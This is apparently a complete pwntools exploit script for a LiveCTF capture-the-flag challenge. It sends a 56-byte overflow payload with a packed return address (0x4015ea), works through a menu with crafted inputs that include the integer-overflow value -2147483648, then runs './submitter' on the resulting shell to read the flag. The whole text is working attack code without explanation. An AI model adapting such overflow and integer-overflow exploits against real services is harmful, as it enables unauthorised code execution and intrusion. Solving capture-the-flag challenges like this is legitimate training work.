#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

name = b''
name += b'A'*56
name += p64(0x4015ea)
p.sendlineafter(": ",name) # name
sleep(0.25)
p.sendlineafter("Choice: ","d")
sleep(0.25)
p.sendlineafter("Choice: ","h")
sleep(0.25)
p.sendlineafter("name: ","213") # name
sleep(0.25)
p.sendlineafter("Choice: ","x")
sleep(0.25)

p.sendlineafter("Choice: ","a")
sleep(0.25)
p.sendlineafter(": ","c")
sleep(0.25)
p.sendlineafter(": ","213") # name
sleep(0.25)
p.sendlineafter(": ","1") # budget
sleep(0.25)
p.sendlineafter(": ","0")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)

p.sendlineafter("Choice: ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)

p.sendlineafter("Choice: ","e")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","-2147483648")
sleep(0.25)
p.sendlineafter(": ","y")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","n")
sleep(0.25)

p.sendlineafter("Choice: ","e")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","y")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","n")
sleep(0.25)
p.sendlineafter("Choice: ","x")
sleep(0.25)

p.sendlineafter("Choice: ","d")
sleep(0.25)
p.sendlineafter("Choice: ","h")
sleep(0.25)
p.sendlineafter("name: ","A"*56) # name
sleep(0.25)
p.sendlineafter("Choice: ","x")
sleep(0.25)

p.sendlineafter("Choice: ","d")
sleep(0.25)
p.sendlineafter("Choice: ","h")
sleep(0.25)
p.sendlineafter("name: ","2134") # name
sleep(0.25)
p.sendlineafter("Choice: ","x")
sleep(0.25)

p.sendlineafter("Choice: ","c")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)

p.sendlineafter("Choice: ","a")
sleep(0.25)
p.sendlineafter(": ","c")
sleep(0.25)
p.sendlineafter(": ","A"*56) # name
sleep(0.25)
p.sendlineafter(": ","11293128") # budget
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)

p.sendlineafter("Choice: ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter(": ","1")
sleep(0.25)
p.sendlineafter("Choice: ","x")
sleep(0.25)
p.sendlineafter("Choice: ","n")

sleep(0.25)
p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()
